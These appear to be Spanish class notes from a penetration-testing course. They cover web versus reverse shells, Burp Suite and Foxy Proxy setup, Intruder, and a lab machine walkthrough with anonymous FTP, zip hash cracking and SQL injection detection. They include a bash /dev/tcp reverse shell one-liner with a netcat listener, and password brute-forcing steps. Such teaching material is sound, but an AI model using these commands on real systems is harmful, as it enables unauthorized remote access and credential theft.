## ① Web Shell vs Reverse Shell

### Web Shell

- Se **sube al servidor** web
- Se ejecuta **desde el servidor** (el servidor interpreta el PHP)
- Accedes a ella desde el navegador: `http://IP/archivo.php`
- Ventaja: siempre disponible mientras no se borre
- Desventaja: necesitas un navegador para ejecutar comandos

### Reverse Shell

- El servidor te **conecta a ti**
- Abres un puerto en tu máquina (con Netcat) y el servidor te envía la conexión
- Ventaja: tienes una terminal completa
- Desventaja: si se cae la conexión, pierdes el acceso

> [!important] Ejemplo de reverse shell
> ```bash
> # En tu máquina (Kali)
> nc -lvnp 4444
>
> # En el servidor (web shell)
> bash -i >& /dev/tcp/TU_IP/4444 0>&1
> ```

---

## ② Diferencia principal

| Web Shell | Reverse Shell |
|---|---|
| Tú accedes al servidor | El servidor te conecta a ti |
| Ejecutas comandos desde el navegador | Tienes una terminal remota |
| El servidor ejecuta el PHP | Tú escuchas en un puerto |
| Siempre disponible | Se cae si se pierde la conexión |

## ③ Configuración de Foxy Proxy

### Para qué sirve

Foxy Proxy es una extensión del navegador que te permite activar/desactivar el proxy de Burp Suite con un clic, sin tener que ir a configuración cada vez.

### Pasos

1. Instalar Foxy Proxy en Firefox
2. Ir a **Opciones** → **Proxies** → **Añadir**
3. Configurar:
   - **Nombre:** Burp
   - **Hostname:** 127.0.0.1
   - **Port:** 8080
4. Guardar
5. Activar/desactivar con el icono de Foxy Proxy

> [!important] No tocar la configuración de proxy del navegador
> Foxy Proxy se encarga de cambiar la configuración automáticamente. Nunca vayas a configuración manual del proxy.

## ④ Configuración de Burp Suite

### Importar certificado

1. Abrir Burp Suite
2. Navegar a `http://burp`
3. Descargar el certificado CA
4. Ir a **Settings** → **Certificates** → **Import**
5. Seleccionar el certificado descargado
6. Marcar las dos casillas y dar OK

> [!important] Solo se hace una vez
> Una vez importado el certificado, no hace falta repetirlo. Con esto, Google y otras webs que bloquean proxies van a funcionar.

## ⑤ Cómo funciona Burp Suite

### Proxy

Burp Suite se coloca como **intermediario** entre tu navegador y el servidor:

```
Navegador → Burp Suite → Servidor
```

Cuando activas el proxy, todas las peticiones pasan por Burp antes de llegar al servidor.

### Intercept

El botón **Intercept** pausa las peticiones antes de que lleguen al servidor. Puedes:
- Ver la petición completa
- Modificarla
- Enviarla o rechazarla

### HTTP History

Todas las peticiones que pasan por Burp quedan registradas en **HTTP History**. Puedes revisarlas después.

## ⑥ Ejemplo práctico con formulario de contacto

1. Activar proxy en Burp
2. Ir al formulario de contacto de la máquina
3. Rellenar y enviar
4. En Burp, ver la petición interceptada:
   ```
   POST /contacto.php HTTP/1.1
   Host: IP
   ...
   nombre=Daniel&email=pepe@gmail.com&mensaje=hola
   ```
5. Modificar el email o el mensaje
6. Enviar y ver qué pasa

## ⑦ Uso de Intruder para automatizar

### Para qué sirve

**Intruder** te permite enviar muchas peticiones automatizadas con variaciones. Ejemplo: probar 100 contraseñas diferentes.

### Configuración básica

1. Clic derecho en la petición → **Send to Intruder**
2. Seleccionar el campo a variar (por ejemplo, el campo `email`)
3. Configurar el payload (lista de contraseñas, números, etc.)
4. Lanzar el ataque
5. Analizar las respuestas (código de estado, longitud)

## ⑧ Starting Point Tier 2 — Máquina Vacinne

### Primeros pasos

1. **Ping**: Verificar conectividad
2. **Nmap**: Escaneo de puertos
   ```bash
   nmap -sC -sV -p- --open IP
   ```
3. **Puertos abiertos**: 21 (FTP), 22 (SSH), 80 (HTTP)

### FTP con acceso anónimo

```bash
ftp IP
# Usuario: Anonymous
# Listar archivos: ls
# Descargar: get backup.zip
```

### Crackeo del zip

```bash
# Sacar el hash del zip
zip2john backup.zip > hash.txt

# Crackear con John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### SQL Injection

En el formulario de búsqueda, si metes una comilla y salta un error, hay SQL Injection:

```
'
```

Error: `You have an error in your SQL syntax...`

Esto confirma que hay una **SQL Injection basada en error**.

## ⑨ Notas de clase

- **Web shell vs Reverse shell**: La diferencia es quién inicia la conexión.
- **Foxy Proxy**: Solo se configura una vez. Activa/desactiva el proxy con un clic.
- **Burp Suite**: Importar el certificado para que las webs HTTPS funcionen.
- **Intruder**: Herramienta para fuzzing automatizado.
- **FTP anónimo**: Si puedes conectarte sin contraseña, siempre revisa qué archivos hay.
- **zip2john + John**: Para crackear contraseñas de archivos zip.
